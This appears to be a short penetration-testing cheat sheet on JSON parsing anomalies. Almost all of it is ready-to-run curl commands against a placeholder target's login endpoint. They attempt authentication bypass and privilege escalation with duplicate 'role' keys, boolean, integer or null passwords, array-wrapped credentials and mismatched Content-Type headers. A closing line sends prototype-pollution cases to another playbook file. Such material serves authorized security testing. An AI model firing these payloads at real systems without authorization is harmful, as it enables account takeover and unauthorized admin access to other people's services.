# JSON anomalies and type confusion

Cheap, no prerequisites — fire at login, register, and every update endpoint that parses JSON.

```bash
# duplicate keys (last-wins in JS, first-wins in Python)
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  --data-binary '{"username":"attacker","role":"user","role":"admin"}'

# type confusion — boolean/int where a string is expected
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":true}'
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":1}'

# null injection — may bypass presence checks
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":null}'

# array wrapping — some frameworks cast ["admin"] to "admin"
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d '{"username":["admin"],"password":["anyvalue"]}'

# content-type switch — body parsed differently per Content-Type
curl -si -X POST <target>/api/login -H 'Content-Type: application/x-www-form-urlencoded' \
  -d '{"username":"admin","password":"admin"}'
curl -si -X POST <target>/api/login -H 'Content-Type: application/json' \
  -d 'username=admin&password=admin'
```

Do not mix direct authorization fields into an unconfirmed prototype-pollution probe. When a
Node/JavaScript app combines a nested JSON merge with an absent-own-property authorization check,
route to `server-side-prototype-pollution.md` and confirm the source with a paired, neutralized
framework oracle first.
